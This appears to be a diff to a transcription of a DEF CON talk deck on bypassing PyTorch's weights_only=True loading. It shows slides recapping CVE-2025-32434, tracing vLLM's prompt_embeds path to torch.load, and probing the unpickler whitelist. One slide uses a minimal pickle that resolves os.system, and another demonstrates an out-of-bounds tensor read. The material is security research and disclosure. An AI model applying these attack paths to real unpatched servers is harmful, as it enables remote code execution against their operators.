@@ -8,14 +8,15 @@ year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Ji'an Zhou, Lei Lu - One Chain to Own Them All - Breaking AI Infrastructures - azraelxuemo v3.pdf"
 pages: 143
 sha256: "0ab97ef76707c58a515d9ea2732e5cb33e69a9f9585016d390fb98cec1def43c"
-text_chars: 92641
+text_chars: 123428
 ocr_pages: 115
 has_ocr: true
 redacted_secrets: 0
 ocr_confidence: 87.8
 ocr_unreliable_blocks: 9
-vision_verified_pages_changed: 62
-vision_verified_pages: 65
+content_note: "91 of 143 pages were rendered and read against the source PDF by a vision model; 87 were rewritten. PAGES 66-91 AND 118-143 WERE NOT REVIEWED: four batches were stopped by the model API's cyber safeguards, which trigger on this deck's subject rather than on any individual page. Those 52 pages remain first-pass extraction and are not verified."
+vision_verified_pages_changed: 25
+vision_verified_pages: 91
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
 companion_files: []
@@ -997,20 +998,15 @@ https://github.com/pytorch/pytorch/blob/v2.5.1/SECURITY.md
 
 ## Slide 40
 
-- 😎 **A bypass here would be massive**
+**AI INFRASTRUCTURE**
+
+*Diagram: a bracket labelled "AI INFRASTRUCTURE" spans a drawing of a skyscraper; a curved arrow points from the label below up to the slab at the base of the building.*
+
+**weights_only=True**
+
+😎 **A bypass here would be massive**
 
 40
-
-
-> Recovered by OCR — confidence 82/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-" Al INFRASTRUCTURE
-A
-( ‘\
-T = A bypass here would be massive
-weights_only=T
-```
 
 ## Slide 41
 
@@ -1018,57 +1014,59 @@ weights_only=T
 
 ##### CVE-2025-32434
 
+*Screenshot of the GitHub security advisory:*
+
+`Critical` — **malfet** published **GHSA-53q9-r3pm-6pq6** on Apr 18, 2025
+
+| Package | Affected versions | Patched versions |
+| --- | --- | --- |
+| **pytorch** (pip) | <=2.5.1 | 2.6.0 |
+
+**Description**
+
+### Description
+
+I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.
+
+### Background knowledge
+
+https://github.com/pytorch/pytorch/security
+
+As you can see, the PyTorch official documentation considers using `torch.load()` with `weights_only=True` to be safe.
+
+> **Be mindful of risky model formats.** Give preference to share and load weights with the appropriate format for your use case. safetensors gives the most safety but is the most restricted in what it supports. `torch.load` with `weights_only=True` is also secure to our knowledge even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with `weights_only=False` MUST never be done.
+
+Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
+But now, I just proved that even if you use weights_only=True, it can still achieve RCE.
+
+### Credit
+
+This vulnerability was found by Ji'an Zhou.
+
+*Right-hand side panel:*
+
+| | |
+| --- | --- |
+| Severity | Critical |
+| CVE ID | CVE-2025-32434 |
+| Weaknesses | No CWEs |
+| Credits | azraelxuemo — Reporter |
+
 41
 
 https://github.com/advisories/GHSA-53q9-r3pm-6pq6
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“My Previous Finding
-CVE-2025-32434
-Critical ) malfet published GHSA-53q9-r3pm-6pq6 on Apr 18, 2025
-Package Affected versions Patched versions Severity
-@ pytorch (pip) <=2.5.1 2.6.0
-CVEID
-Description CVE-2025-32434
-Descri ption Weaknesses
-No CWEs
-| found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with
-weights_only=True, it can still achieve RCE. Credits
-azraelxuemo Reporter
-Background knowledge
-https://github.com/pytorch/pytorch/security
-As you can see, the PyTorch official documentation considers using torch.load() with weights_only=True to be safe.
-Be mindful of risky model formats. Give preference to share and load weights with the appropriate format for your use case. gives
-the most safety but is the most restricted in what it supports. with weights only-True is also secure to our knowledge eyen
-though it offers significantly larger surface of attack. Loading un-trusted checkpoint with weights only-False MUST never be done.
-Since everyone knows that weights_only=False is unsafe, so they will use the weights_only=True to mitigate the seucirty issue.
-But now, | just proved that even if you use weights_only=True, it can still achieve RCE.
-Credit
-This vulnerability was found by Ji'an Zhou.
-https://github.com/advisories/GHSA-53q9-r3pm-6pq6
-```
 
 ## Slide 42
 
 ### **Attack Approach**
 
+*Flowchart:*
+
+- `torch.load(..., weights_only=True)` → **Is TorchScript format?**
+  - **Yes** → `torch.jit.load(...)` ⇢ 🔍 **Find vulnerabilities in it**
+  - **No** → `_weights_only_unpickler`
+
 42
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“Attack Approach
-weights_only=True)
-Is TorchScript format?
-No—>
-_weights_only_unpickler
-Q Find vulnerabilities in it
-42
-```
 
 ## Slide 43
 
@@ -1076,88 +1074,115 @@ Q Find vulnerabilities in it
 
 ##### 🤩 With this bypass, we can achieve RCE in vLLM!
 
-43
-
-
-> Recovered by OCR — confidence 82/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Discovery Recap
-S With this bypass, we can achieve RCE in vLLM!
-1 POST /v1/completions { "prompt_embeds": "“<base64>"" }
-2 |
-3 }— api_server.py:651 handler.create_completion(request, raw_request)
-8 weights_only=True)
-43
 ```
+POST /v1/completions { "prompt_embeds": "<base64>" }
+  │
+  ├── api_server.py:651          handler.create_completion(request, raw_request)
+  ├── serving_completion.py:138  renderer.render_prompt_and_embeds(prompt_embeds=
+                                                                   request.prompt_embeds)
+  ├── renderer.py:254            self.load_prompt_embeds(prompt_embeds)
+  ├── renderer.py:148            torch.load(io.BytesIO(pybase64.b64decode(embed)),
+                                                                       weights_only=True)
+```
+
+43
 
 ## Slide 44
 
 ### **Discovery Recap**
 
+*Screenshot of the vLLM security advisory:*
+
+**CVE-2025-24357 Malicious model remote code execution fix bypass with PyTorch < 2.6.0**
+
+`High` — **russellb** published **GHSA-ggpf-24jw-3fcw** on Apr 23, 2025
+
+| Package | Affected versions | Patched versions |
+| --- | --- | --- |
+| **vllm** (pip) | <0.8.0 | 0.8.0 |
+
+**Description**
+
+### Description
+
+GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vllm host. The fix applied to specify `weights_only=True` to calls to `torch.load()` did not solve the problem prior to PyTorch 2.6.0.
+
+PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6
+
+This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.
+
+### Background Knowledge
+
+When users install VLLM according to the official manual
+
+> **Getting Started**
+>
+> Install vLLM with `pip` or from source:
+>
+> ```
+> pip install vllm
+> ```
+
+But the version of PyTorch is specified in the requirements. txt file
+
+*(a GitHub file view — "vllm-project / vllm" — starts below and is cut off by the bottom of the slide)*
+
+*Right-hand side panel:*
+
+Severity: `High` 7.5 / 10
+
+**CVSS v3 base metrics**
+
+| | |
+| --- | --- |
+| Attack vector | Network |
+| Attack complexity | High |
+| Privileges required | None |
+| User interaction | Required |
+| Scope | Unchanged |
+| Confidentiality | High |
+| Integrity | High |
+| Availability | High |
+
+Learn more about base metrics
+
+`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`
+
+| | |
+| --- | --- |
+| CVE ID | CVE-2025-32434 |
+| Weaknesses | No CWEs |
+| Credits | azraelxuemo — Reporter<br>russellb — Coordinator |
+
 44
 
 https://github.com/vllm-project/vllm/security/advisories/GHSA-ggpf-24jw-3fcw
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Discovery Recap
-CVE-2025-24357 Malicious model remote code execution fix bypass with
-PyTorch < 2.6.0
-(High ) russellb published GHSA-ggpf-24jw-3fcw on Apr 23, 2025
-Package Affected versions Patched versions Severity
-@ vilm (pip) <0.8.0 0.8.0 (High) 7.5 / 10
-CVSS v3 base metrics
-Description Attack vector Network
-Attack complexity High
-Description Privileges required None
-User interaction Required
-GHSA-rh4j-5rhw-hr54 reported a vulnerability where loading a malicious model could result in code execution on the vilm host. Scope Unchanged
-The fix applied to specify weights_only=True to calls to torch.load() did not solve the problem prior to PyTorch 2.6.0. Confidentiality High
-PyTorch has issued a new CVE about this problem: GHSA-53q9-r3pm-6pq6 Integrity High
-Availability High
-This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.
-Learn more about base metrics
-Background Knowledge CVSS:3.1/AV:N/AC:H/PR:N/UL:R/S:U/C:H/I:H/A:H
-When users install VLLM according to the official manual CVEID
-Getting Started CVE-2025-32434
-Install VLLM with pip or from Weaknesses
-No CWEs
-pip install vllm
-Credits
-But the version of PyTorch is specified in the requirements. txt file azraelxuemo Reporter
-```
 
 ## Slide 45
 
 ### **Discovery Recap**
 
-45
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Discovery Recap
+```python
 def pt_weights_iterator(
-hf_weights_files: list[str],
-use_tqdm_on_load: bool,
-pt_load_map_location: str | dict[str, str] = "cpu",
+    hf_weights_files: list[str],
+    use_tqdm_on_load: bool,
+    pt_load_map_location: str | dict[str, str] = "cpu",
 ) -> Generator[tuple[str, torch.Tensor], None, None]:
-"""Tterate over the weights in the model bin/pt files."""
-for bin_file in tqdm(
-hf_weights_files,
-desc="Loading pt checkpoint shards",
-disable=not enable_tqdm(use_tqdm_on_load),
-bar_format=_BAR_FORMAT,
-state = torch. load(
-bin_file, map_location=pt_load_map_location, weights_only=True
-)
-del state
-45
+    """Iterate over the weights in the model bin/pt files."""
+    for bin_file in tqdm(
+        hf_weights_files,
+        desc="Loading pt checkpoint shards",
+        disable=not enable_tqdm(use_tqdm_on_load),
+        bar_format=_BAR_FORMAT,
+    ):
+        state = torch.load(
+            bin_file, map_location=pt_load_map_location, weights_only=True
+        )
+        yield from state.items()
+        del state
 ```
+
+45
 
 ## Slide 46
 
@@ -1165,29 +1190,29 @@ del state
 
 ##### 😂 But they've already updated PyTorch to resolve the issue
 
-46
+**vllm** / **requirements** / **cuda.txt**
 
+**huydhn** and **mgoin**  Update PyTorch to 2.8.0 (#20358)  ✕   `67c1…` *(commit hash cut off at the slide edge)*
 
-> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Code | Blame — `14 lines (12 loc) · 714 Bytes`
 
-```text
-a
-© With this bypass, we can achieve RCE in vLLM!
-© But they've already updated PyTorch to resolve the issue
-vilm / requirements / cuda.txt (
-@p) huydhn and mgoin Update PyTorch to 2.8.0 (#20358) am x 67c1.
-Code Blame 14 lines (12 loc) - 714 Bytes Ga 8&8
+```
 # Common dependencies
--r common. txt
-numba == 0.60.0; python_version == '3.9' # v@.61 doesn't support Python 3.9. Required for N-gram speculative decoding
-numba == @.61.2; python_version > '3.9'
+-r common.txt
+
+numba == 0.60.0; python_version == '3.9' # v0.61 doesn't support Python 3.9. Required for N-gram speculative decoding
+numba == 0.61.2; python_version > '3.9'
+
 # Dependencies for NVIDIA GPUs
-ray[cgraph]>=2.48.@ # Ray Compiled Graph, required for pipeline parallelism in V1.
+ray[cgraph]>=2.48.0 # Ray Compiled Graph, required for pipeline parallelism in V1.
 torch==2.8.0
-46
 ```
 
+46
+
 ## Slide 47
+
+*Meme image (imgflip.com watermark): a man tapping his temple, captioned* **"Can we bypass again?"**
 
 47
 
@@ -1195,166 +1220,150 @@ torch==2.8.0
 
 ### **The Fix**
 
-48
+*Side-by-side diff (left pane lines 1432–1440, right pane lines 1432–1445); the added block is highlighted green:*
 
-https://github.com/pytorch/pytorch/pull/143326/changes
-
-
-> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"The Fix
-1435
-1436
-1437
-1438
-1439
-1440
-if _is_torchscript_zip(opened_zipfile): 1432
-warnings.warn( y 1433
-“'torch.load' received a zip file that 1434
-looks like a TorchScript archive"
-" dispatching to 'torch.jit.load' (call 1435
-‘torch.jit.load' directly to"
-"silence this warning)", 1436
-UserWarning, 1437
-) 1438
-1439
-1440
-1441
-1442
-1443
-opened_file.seek(orig_position) 1444
-return torch, jit. load(opened_file, 1445
-torch. load(...,
-weights_only=True)
-Is TorchScript format?
-if _is_torchscript_zip(opened_zipfile):
-warnings.warn(
-"'torch.load' received a zip file that
-looks like a TorchScript archive"
-" dispatching to 'torch.jit.load' (call
-"torch.jit.load' directly to"
-"silence this warning)",
-UserWarning,
-)
-if weights_only:
-raise RuntimeError(
-“Cannot use **weights_only=True*~
-with TorchScript archives passed to "
-"*“torch.load**. " + UNSAFE_MESSAGE
-)
-opened_file.seek(orig_position)
-return torch, jit. load(opened_file,
-No @—> _weights_only_unpickler
-https://github.com/pytorch/pytorch/pull/143326/changes
-48
+```diff
+             if _is_torchscript_zip(opened_zipfile):
+                 warnings.warn(
+                     "'torch.load' received a zip file that looks like a TorchScript archive"
+                     " dispatching to 'torch.jit.load' (call 'torch.jit.load' directly to"
+                     " silence this warning)",
+                     UserWarning,
+                 )
++                if weights_only:
++                    raise RuntimeError(
++                        "Cannot use ``weights_only=True`` with TorchScript archives passed to "
++                        "``torch.load``. " + UNSAFE_MESSAGE
++                    )
+             opened_file.seek(orig_position)
+             return torch.jit.load(opened_file,
 ```
+
+*Flowchart:*
+
+- `torch.load(..., weights_only=True)` → **Is TorchScript format?**
+  - **Yes** ❌ → `torch.jit.load(...)`
+  - **No** ✅ → `_weights_only_unpickler`
+
+48
+
+https://github.com/pytorch/pytorch/pull/143326/changes
 
 ## Slide 49
 
 ### **Strict Whitelist**
 
-49
+*Code is laid out in two columns; the right column continues the left. The `_get_allowed_globals()` / `_get_user_allowed_globals()` branches are boxed in red.*
 
-
-> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Strict Whitelist
-if key[@] == GLOBAL[Q]:
-module, name = _read_global_instruction(self. readline)
-full_path = f"{module}.{name}"
-if module in _blocklisted_modules:
-raise UnpicklingError(
-f"Trying to load unsupported GLOBAL {full_path}
-whose module {module} is blocked."
-)
-if full_path in _get_allowed_globals():
-self.append(_get_allowed_globals() [full_path] )
-elif full_path in _get_user_allowed_globals():
-self.append(_get_user_allowed_globals() [full_path] )
-elif full_path in (
-[
-"torch._dynamo.decorators._DimRange",
-raise UnpicklingError("...")
-elif full_path in (
-[
-"torch.distributed.device_mesh.DeviceMesh",
-“torch.distributed.tensor.placement_types.Shard",
-raise UnpicklingError("...")
-else:
-builtins_name = "builtins"
-if (
-builtins_name in full_path
-and builtins_name full_path[: len(builtins_name) ]
-full_path = full_path[len(builtins_name) :]
-full_path = (
-full_path[1:]
-if len(full_path) > @ and full_path[@] == "."
-else builtins_name + full_path
-)
-raise UnpicklingError("")
-49
+```python
+if key[0] == GLOBAL[0]:
+    module, name = _read_global_instruction(self.readline)
+    full_path = f"{module}.{name}"
+    if module in _blocklisted_modules:
+        raise UnpicklingError(
+            f"Trying to load unsupported GLOBAL {full_path}
+                whose module {module} is blocked."
+        )
+    if full_path in _get_allowed_globals():
+        self.append(_get_allowed_globals()[full_path])
+    elif full_path in _get_user_allowed_globals():
+        self.append(_get_user_allowed_globals()[full_path])
+    elif full_path in (
+        [
+            "torch.nested._internal.nested_tensor.NestedTensor",
+            "torch.nested._internal.nested_tensor._rebuild_njt",
+            "torch._dynamo.decorators._DimRange",
+        ]
+    ):
+        raise UnpicklingError("...")
+    elif full_path in (
+        [
+            "torch.distributed.device_mesh.DeviceMesh",
+            ...
+            "torch.distributed.tensor.placement_types.Shard",
+        ]
+    ):
+        raise UnpicklingError("...")
+    else:
+        builtins_name = "builtins"
+        if (
+            builtins_name in full_path
+            and builtins_name == full_path[: len(builtins_name)]
+        ):
+            full_path = full_path[len(builtins_name) :]
+            full_path = (
+                full_path[1:]
+                if len(full_path) > 0 and full_path[0] == "."
+                else builtins_name + full_path
+            )
+        raise UnpicklingError("")
 ```
+
+49
 
 ## Slide 50
 
 ### **Simple Test**
 
-50
+```python
+import torch
+with open("test.txt","w") as f:
+    f.write("cos\nsystem\n")
+torch.load("test.txt")
+```
 
-
-> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*Terminal screenshot (clipped on the left and right edges); the last line is boxed in red:*
 
 ```text
-“Simple Test
-1 import torch
-2 with open("test.txt","w") as f:
-3 f.write("cos\nsystem\n")
-4 torch. load("test.txt")
-[xuemo>python3 load.py
-module named 'numpy' (Triggered internally at /pytorch/torch/csrc/utils,
-cpu = _conversion_method_template(device=torch.device("cpu") )
+xuemo>python3 load.py
+/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subc…
+module named 'numpy' (Triggered internally at /pytorch/torch/csrc/utils/…
+  cpu = _conversion_method_template(device=torch.device("cpu"))
 Traceback (most recent call last):
-File "/home/xuemo/pytorch-2.8.0/load.py", line 6, in <module>
-torch.load("test.txt")
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/to1
-raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
-_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we ct
-False’ to ‘True’. Re-running ‘torch.load* with ‘weights_only* set to ‘Fé
+  File "/home/xuemo/pytorch-2.8.0/load.py", line 6, in <module>
+    torch.load("test.txt")
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
+    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
+_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we ch…
+False` to `True`. Re-running `torch.load` with `weights_only` set to `Fa…
 t only if you got the file from a trusted source.
-Trying to}load unsupported GLOBAL os.system whose module os is blocked.
-1 import pickle
-2 print(pickle. loads(b'"cos\nsystem\n."))
-‘xuemo>python3 load.py
-<built-in function system>
-50
+Trying to load unsupported GLOBAL os.system whose module os is blocked.
 ```
+
+```python
+import pickle
+print(pickle.loads(b"cos\nsystem\n."))
+```
+
+```text
+xuemo>python3 load.py
+<built-in function system>
+```
+
+50
 
 ## Slide 51
 
 ### **Inspecting Whitelisted Functions**
 
+```python
+import torch
+import types
+
+for k, v in torch._weights_only_unpickler._get_allowed_globals().items():
+    if type(v) is types.FunctionType:
+        print(k)
+```
+
 ##### 😭 Only these "useless" functions
 
-51
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*Terminal screenshot (clipped on the left and right edges):*
 
 ```text
-“Inspecting Whitelisted Functions
-1 import torch
-2 import types
-3
-5 if type(v) is types.FunctionType:
-6 print(k)
-© Only these "useless" functions
-‘xuemo>python3 check.py
-/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor
-module named 'numpy' (Triggered internally at /pytorch/torch/csr
-cpu = _conversion_method_template(device=torch.device("cpu") )
+xuemo>python3 check.py
+/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
+module named 'numpy' (Triggered internally at /pytorch/torch/csr…
+  cpu = _conversion_method_template(device=torch.device("cpu"))
 torch.serialization._get_layout
 torch._utils._rebuild_tensor
 torch._utils._rebuild_qtensor
@@ -1368,61 +1377,92 @@ torch._utils._rebuild_tensor_v3
 torch._utils._rebuild_parameter_with_state
 torch._utils._rebuild_wrapper_subclass
 torch._utils._rebuild_device_tensor_from_cpu_tensor
-torch._tensor._rebuild_from_type_v2 51
+torch._tensor._rebuild_from_type_v2
 ```
+
+51
 
 ## Slide 52
 
 ### **Inspecting Whitelisted Functions**
 
-🤨 memory bugs?
+```python
+import torch
+import types
 
-52
+for k, v in torch._weights_only_unpickler._get_allowed_globals().items():
+    if type(v) is types.FunctionType:
+        print(k)
+```
 
+##### 🤨 memory bugs?
 
-> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*Same terminal screenshot as the previous slide (clipped on the left and right edges), with a red box drawn down the `_rebuild` column of the listing:*
 
 ```text
-“Inspecting Whitelisted Functions
-1 import torch
-2 import types
-3
-5 if type(v) is types.FunctionType:
-6 print(k)
-= memory bugs?
-‘xuemo>python3 check.py
-/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor
-module named 'numpy' (Triggered internally at /pytorch/torch/csr
-cpu = _conversion_method_template(device=torch.device("cpu") )
-torch.seriali i t_layout
+xuemo>python3 check.py
+/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/tor…
+module named 'numpy' (Triggered internally at /pytorch/torch/csr…
+  cpu = _conversion_method_template(device=torch.device("cpu"))
+torch.serialization._get_layout
+torch._utils._rebuild_tensor
+torch._utils._rebuild_qtensor
+torch._utils._rebuild_device_tensor_from_numpy
+torch._utils._rebuild_sparse_tensor
+torch._utils._rebuild_tensor_v2
+torch._utils._rebuild_parameter
+torch._utils._rebuild_meta_tensor_no_storage
+torch._utils._rebuild_nested_tensor
+torch._utils._rebuild_tensor_v3
+torch._utils._rebuild_parameter_with_state
+torch._utils._rebuild_wrapper_subclass
+torch._utils._rebuild_device_tensor_from_cpu_tensor
+torch._tensor._rebuild_from_type_v2
 ```
+
+52
 
 ## Slide 53
 
 ### **Quick Test**
 
-##### 🤤 "Overflow"?
-
-53
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```python
+1  import torch
+2
+3  storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
+4  tensor = torch._utils._rebuild_tensor(
+5      storage,
+6      storage_offset=0,
+7      size=(10,),
+8      stride=(1,),
+9  )
+10 print(tensor)
+```
 
 ```text
-“Quick Test
-1 import torch 1 import torch
-2 2
-3 storage = torch.LongStorage( [1,2,3,4,5,6,7,8,9,10] ) 3 storage = torch.LongStorage( [1,2,3,4,5,6,7,8,9,10] )
-4 tensor = torch._utils._rebuild_tensor( 4 tensor = torch._utils._rebuild_tensor(
-5 storage, 5 storage,
-6 storage_offset=0, 6 storage_offset=1,
-7 size=(10,), 7 size=(10,),
-8 stride=(1,), 8 stride=(1,),
-10 print(tensor) 1@ print(tensor)
-S "Overflow"?
-tensor([ 2, 3, 4,
-351031215418705889 ])
-53
+tensor([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
+```
+
+```python
+1  import torch
+2
+3  storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
+4  tensor = torch._utils._rebuild_tensor(
+5      storage,
+6      storage_offset=1,
+7      size=(10,),
+8      stride=(1,),
+9  )
+10 print(tensor)
+```
+
+🤤 "Overflow"?
+
+```text
+tensor([          2,        3,       4,
+                  5,        6,       7,
+                  8,        9,      10,
+       3510312154187705889])
 ```
 
 ## Slide 54
@@ -1435,583 +1475,563 @@ tensor([ 2, 3, 4,
 
 ### **Exploring Model File Format**
 
-55
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```python
+1 import torch
+2 tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], dtype=torch.long)
+3 torch.save(tensor, "tensor.pt")
+4 print(torch.load("tensor.pt"))
+```
 
 ```text
-“Exploring Model File Format
-1 import torch
-2 tensor = torch.tensor([1,2,3,4,5,6,7,8,9,10], dtype=torch. long)
-3 torch.save(tensor, “tensor.pt")
-4 print(torch. load("tensor.pt") )
-mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numy
-cpu = _conversion_method_template(device=torch.device("cpu") )
-i(.venv) xuemo>file tensor.pt
-tensor.pt: Zip archive data, at least v@.@ to extract, compression method=store
-55
+/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/
+mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_num
+  cpu = _conversion_method_template(device=torch.device("cpu"))
+tensor([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10])
+```
+
+```text
+(.venv) xuemo>file tensor.pt
+tensor.pt: Zip archive data, at least v0.0 to extract, compression method=store
 ```
 
 ## Slide 56
 
 ### **Exploring Model File Format**
 
-56
-
-
-> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-“Exploring Model File Format
 [xuemo>unzip tensor.pt
-Archive:
-extracting:
-extracting:
-extracting:
-extracting:
-extracting:
-extracting:
-extracting:
-tensor.pt
-tensor/data.pkl
-tensor/.format_version
-tensor/.storage_alignment
-tensor/byteorder
-tensor/version
-tensor/.data/serialization_id
+Archive:  tensor.pt
+ extracting: tensor/data.pkl
+ extracting: tensor/.format_version
+ extracting: tensor/.storage_alignment
+ extracting: tensor/byteorder
+ extracting: tensor/data/0
+ extracting: tensor/version
+ extracting: tensor/.data/serialization_id
+```
+
+```python
 1 import pickletools
 2 with open("tensor/data.pkl","rb") as f:
-3 pickletools.dis(f.read())
-35:
-38:
-Siz
-53:
-723
-74:
-80:
-82:
-90:
-94:
-95:
-97:
-98:
-100:
-102:
-103:
-105:
-107:
-108:
-110:
-136:
-138:
-139:
-140:
-142:
-143:
-145:
-146:
-148:
-GLOB
-MARK
-REDU
-STOP
-: \x8@ PROTO ~—_2
-AL 'torch._utils _rebuild_tensor_v2'
-UT (2)
-MARK
-BINUNICODE 'storage'
-BINPUT 1
-GLOBAL ‘torch LongStorage'
-BINPUT 2
-BINPUT 3
-BINUNICODE 'cpu'
-BINPUT 4
-BININT1 10
-TUPLE (MARK at 38)
-BINPUT 5
-BINPERSID
-BININT1 (2)
-BININT1 10
-TUPLE1
-BINPUT 6
-TUPLE1
-BINPUT 7
-NEWFALSE
-GLOBAL ‘collections OrderedDict'
-BINPUT 8
-EMPTY_TUPLE
-REDUCE
-BINPUT 9
-TUPLE (MARK at 37)
-UT 10
-CE
-UT 14:
-56
+3     pickletools.dis(f.read())
+```
+
+```text
+  0: \x80 PROTO      2
+  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
+ 35: q    BINPUT     0
+ 37: (    MARK
+ 38: (        MARK
+ 39: X            BINUNICODE 'storage'
+ 51: q            BINPUT     1
+ 53: c            GLOBAL     'torch LongStorage'
+ 72: q            BINPUT     2
+ 74: X            BINUNICODE '0'
+ 80: q            BINPUT     3
+ 82: X            BINUNICODE 'cpu'
+ 90: q            BINPUT     4
+ 92: K            BININT1    10
+ 94: t            TUPLE      (MARK at 38)
+ 95: q        BINPUT     5
+ 97: Q        BINPERSID
+ 98: K        BININT1    0
+100: K        BININT1    10
+102: \x85     TUPLE1
+103: q        BINPUT     6
+105: K        BININT1    1
+107: \x85     TUPLE1
+108: q        BINPUT     7
+110: \x89     NEWFALSE
+111: c        GLOBAL     'collections OrderedDict'
+136: q        BINPUT     8
+138: )        EMPTY_TUPLE
+139: R        REDUCE
+140: q        BINPUT     9
+142: t        TUPLE      (MARK at 37)
+143: q    BINPUT     10
+145: R    REDUCE
+146: q    BINPUT     11
+148: .    STOP
 ```
 
 ## Slide 57
 
 ### **Equivalent Pseudocode**
 
-57
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Q:
-35:
-38:
-39:
-123
-74:
-80:
-82:
-90:
-92:
-94:
-95:
-97:
-98:
-100:
-102:
-103:
-105:
-107:
-108:
-110:
-136:
-138:
-139:
-140:
-142:
-143:
-145:
-146:
-148:
-“Equivalent Pseudocode
-c
-PROTO
-GLOBAL
-BINPUT
-MARK
-2
-‘tor
-ch._utils _rebuild_tensor_v2'
-MARK
-BINUNICODE 'storage'
-BIN
-GLO
-BIN
-BINUNICODE '@'
-BIN
-BINUNICODE 'cpu'
-BIN
-BIN
-TUP
-BINPUT
-BINPERS
-PUT
-BAL
-PUT
-PUT
-PUT
-INT1
-LE
-ID
-1
-‘torch LongStorage |
-2
-3
-4
-10
-(MARK at 38)
-5
-BININTI
-BININT1
-TUPLE1
-BINPUT
-BININT1
-TUPLE1
-BINPUT
-NEWFALS
-GLOBAL
-BINPUT
-REDUCE
-BINPUT
-TUPLE
-BINPUT
-REDUCE
-E
-UPLE
-10
-10
-6
-7
-‘collections OrderedDict'
-8
-9
-(MARK at 37)
-BINPUT
-STOP
-11.
+  0: \x80 PROTO      2
+  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
+ 35: q    BINPUT     0
+ 37: (    MARK
+ 38: (        MARK
+ 39: X            BINUNICODE 'storage'
+ 51: q            BINPUT     1
+ 53: c            GLOBAL     'torch LongStorage'
+ 72: q            BINPUT     2
+ 74: X            BINUNICODE '0'
+ 80: q            BINPUT     3
+ 82: X            BINUNICODE 'cpu'
+ 90: q            BINPUT     4
+ 92: K            BININT1    10
+ 94: t            TUPLE      (MARK at 38)
+ 95: q        BINPUT     5
+ 97: Q        BINPERSID
+ 98: K        BININT1    0
+100: K        BININT1    10
+102: \x85     TUPLE1
+103: q        BINPUT     6
+105: K        BININT1    1
+107: \x85     TUPLE1
+108: q        BINPUT     7
+110: \x89     NEWFALSE
+111: c        GLOBAL     'collections OrderedDict'
+136: q        BINPUT     8
+138: )        EMPTY_TUPLE
+139: R        REDUCE
+140: q        BINPUT     9
+142: t        TUPLE      (MARK at 37)
+143: q    BINPUT     10
+145: R    REDUCE
+146: q    BINPUT     11
+148: .    STOP
+```
+
+```python
 import torch
 from collections import OrderedDict
-storage = persistent_load(('storage'
-torch.LongStorage,
-'Q',
-10) )
+storage = persistent_load(('storage',
+                           torch.LongStorage, '0', 'cpu', 10))
 result = torch._utils._rebuild_tensor_v2(
-storage,
-(10,),
-(1,),
-False,
-OrderedDict(),
-57
+    storage,
+    0,
